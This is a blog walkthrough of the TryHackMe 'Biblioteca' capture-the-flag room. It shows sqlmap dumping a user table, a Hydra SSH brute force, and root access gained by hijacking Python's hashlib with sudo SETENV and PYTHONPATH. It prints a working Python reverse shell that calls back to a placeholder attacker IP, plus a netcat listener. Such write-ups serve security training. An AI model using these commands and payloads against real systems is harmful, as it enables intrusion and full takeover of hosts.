+++
title = "THM: Biblioteca -- Write-Up"
description = "Walkthrough write-up of the TryHackMe Biblioteca CTF"
type = ["posts","post"]
tags = [
    "blog",
    "tryhackme",
    "nmap",
    "hydra",
    "sqlmap",
    "python",
    "library hijacking",
]
date = "2022-07-08T13:04:00"
categories = [
    "ctf",
    "TryHackMe",
]
[ author ]
  name = "Rob"
+++

## About 
Biblioteca is a *medium* rated CTF room on [TryHackMe](www.tryhackme.com). Rooting this box involves carrying out a successful SQL injection to obtain a foothold, identifying an opportunity for a "lateral privilege escalation" via brute-force attack, and further escalation to `root` via Python library hijacking. 

**Note:** I have replaced all instances of the virtual machine's ip address with `<target-ip>` throughout this write-up.

## Enumeration

### nmap

I began by running a standard nmap scan against the target host.

`nmap -sCV -oN nmap.out <target-ip>`
```
Nmap scan report for <target-ip>
Host is up (0.099s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
|_  256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)

8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Our scan identified two active/open ports, `22`, which hosts a standard OpenSSH service and `8000`, which houses a Werkzeug python. While Werkzeug is *primarily* a Python library, it has the ablity to function as a development http server for testing purposes. This is often the CTF context that it appears in.

### Manual enumeration

Visiting the Werkzeug port via a web browser immediately redirects us to `http://<target-ip>:8000/login`. 

![biblioteca-login](/images/biblioteca/login.png)

This seems to be a standard login page/form. We can register a standard account with no problem, but that doesn't get us anything other than a polite welcome message.

## SQL Injection

As we were able to register a new set of credentials, we can assume that the data is being stored somewhere. Thus, we can probe the form with SQLMap to identify whether or not it is vulnerable to an SQL injection attack.

### SQLMap
`sqlmap -u http://<target-ip>:8000/login --data 'username='test'&password='test'' --dbs --dump`

```
[13:05:47] [INFO] testing connection to the target URL
[13:05:48] [INFO] testing if the target URL content is stable
[13:05:48] [INFO] target URL content is stable
[13:05:48] [INFO] testing if POST parameter 'username' is dynamic

✂️ ................................ ✂️

[13:06:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[13:06:26] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] website

[13:06:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[13:06:27] [INFO] fetching current database
[13:06:27] [INFO] fetching tables for database: 'website'
[13:06:27] [INFO] fetching columns for table 'users' in database 'website'
[13:06:27] [INFO] fetching entries for table 'users' in database 'website'
Database: website
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | s-----@email.boop | M------------ | s-----   |
+----+-------------------+----------------+----------+

```


## Foothold

Now that we have user credentials, we can use them to log-in to the server via SSH. From there, we do more manual enumeration to identify a privilege escalation vector.

### More Enumeration

```
s-----@biblioteca:~$ pwd
/home/s-----
```

```
s-----@biblioteca:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
✂️ ................................ ✂️
s-----:x:1000:1000:s-----:/home/s-----:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
h----:x:1001:1001::/home/h----:/bin/bash
```
Great! From the `/etc/passwd` file, we can see that there is also user `h----`. Let's check their home directory.

```
s-----@biblioteca:/home/h----$ ls -lsa
total 32
4 drwxr-xr-x 3 root  root  4096 Mar  2 03:01 .
4 drwxr-xr-x 4 root  root  4096 Dec  7 02:42 ..
0 lrwxrwxrwx 1 root  root     9 Dec  7 03:24 .bash_history -> /dev/null
4 -rw-r--r-- 1 h---- h----  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 h---- h---- 3771 Feb 25  2020 .bashrc
4 drwx------ 2 h---- h---- 4096 Dec  7 02:54 .cache
4 -rw-r----- 1 root  h----  497 Dec  7 02:53 hasher.py
4 -rw-r--r-- 1 h---- h----  807 Feb 25  2020 .profile
4 -rw-r----- 1 root  h----   45 Mar  2 03:01 user.txt
0 -rw------- 1 h---- h----    0 Dec  7 03:23 .viminfo
```

In addition to the user flag, we see that there is a script named `hasher.py` in the `h----` home directory. Moreover, this file is owned by root! 

```
s-----@biblioteca:/home/h----$ sudo -l
[sudo] password for s-----: 
Sorry, user s----- may not run sudo on biblioteca.
```

## Exploitation - SSH


While we can't interact with it as `s-----`, it's likely that we will be able to as the user `h----`. Let's try to brute force that account's SSH credentials with Hydra.


`hydra -t 4 -l h---- -P /usr/share/wordlists/rockyou.txt -vV <target-ip> ssh`
```
[ATTEMPT] target <target-ip> - login "h----" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "iloveyou" - 5 of 14344399 [child 0] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "princess" - 6 of 14344399 [child 1] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "1234567" - 7 of 14344399 [child 2] (0/0)
✂️ ................................ ✂️
[ATTEMPT] target <target-ip> - login "h----" - pass "yomama" - 2056 of 14344399 [child 3] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "spooky" - 2057 of 14344399 [child 1] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "pimpin1" - 2058 of 14344399 [child 3] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "maricel" - 2059 of 14344399 [child 0] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "gizmo1" - 2060 of 14344399 [child 3] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "dondon" - 2061 of 14344399 [child 0] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "divine" - 2062 of 14344399 [child 0] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "chucky" - 2063 of 14344399 [child 0] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "aries" - 2064 of 14344399 [child 0] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "rowena" - 2065 of 14344399 [child 2] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "nokia" - 2066 of 14344399 [child 2] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "stitch" - 2067 of 14344399 [child 2] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "jerry" - 2068 of 14344399 [child 2] (0/0)
[ATTEMPT] target <target-ip> - login "h----" - pass "h----" - 2069 of 14344399 [child 2] (0/0)
[22][ssh] host: <target-ip>   login: h----   password: h----
[STATUS] attack finished for <target-ip> (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```
We can now connect as user `h----` via SSH and access `hasher.py` (as well as the user flag)!

## Privilege Escalation

### `sudo -l`

**As a refresher:** The `sudo` command represents one of the most straightforward Linux privilege escalation vectors. By default, the command allows you to run a program with root privileges. Beyond this, system administrators may provision standard user accounts `sudo` privileges related to the execution of context-specific program execution.

To check which, if any, `sudo` privileges that a user has, we can run `sudo` with the `-l` flag to list commands that the current user is allowed (and/or prohibited) from executing with elevated permissions. The `-U` flag can be used to specify another valid user on the current host machine. 

```
h----@biblioteca:~$ sudo -l
Matching Defaults entries for h---- on biblioteca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User h---- may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/h----/hasher.py

```

Here we see `SETENV`, which means we can set the environment variables while running the listed script as root! In this context, we see that `hasher.py` imports `hashlib.py`. 

Thus, we have the ability to create a fraudulent `hashlib.py` file containing reverse shell code that the user `h----` can execute as `root` via `hasher.py`.

First, we find `hashlib.py`:
```
h----@biblioteca:~$ find / -name hashlib.py 2>/dev/null
/snap/core20/1361/usr/lib/python3.8/hashlib.py
/snap/core20/1270/usr/lib/python3.8/hashlib.py
/snap/core18/2284/usr/lib/python3.6/hashlib.py
/snap/core18/2253/usr/lib/python3.6/hashlib.py
/usr/lib/python3/dist-packages/landscape/lib/hashlib.py
/usr/lib/python3/dist-packages/nacl/hashlib.py
/usr/lib/python3.8/hashlib.py

```

We then copy the script to  the `/tmp` directory:
```
h----@biblioteca:/usr/lib/python3.8$ cp hashlib.py /tmp
h----@biblioteca:/usr/lib/python3.8$ cd /tmp
```

Next, we edit our "new" `hashlib.py` script to contain a basic python reverse shell:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attack-ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Finally, we take advantage of our `SETENV` privileges to run the script with an added `PYTHONPATH` argument. `PYTHONPATH` is an environmental variable that adds an additional directory (or directories) that Python checks for modules and packages at runtime. Conventionally, this is used to include custom Python libraries that are otherwise inappropriate to place in the default global location.

```
h----@biblioteca:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/h----/hasher.py
```

```
╭─[kali-bot] as virtualtack in ~
╰──➤ nc -lvnp <port>                        
listening on [any] <port> ...
connect to [<my=ip>] from (UNKNOWN) [<target-ip>] 35176
# whoami
whoami
root
# ls /root 
ls /root
root.txt  snap
# cat /root/root.txt
cat /root/root.txt
THM{P-----------------------}

```

## Lessons learned

* I often forget to stabilize my python-enabled shells as a reflexive best practice. This can be done, for example, with `python -c 'import pty;pty.spawn("/bin/bash")'`
* This room introduced me to Python library hijacking. More can be read about this topic on:
    * [Raj Chandel's Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)
    * [rastating.github.io](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) 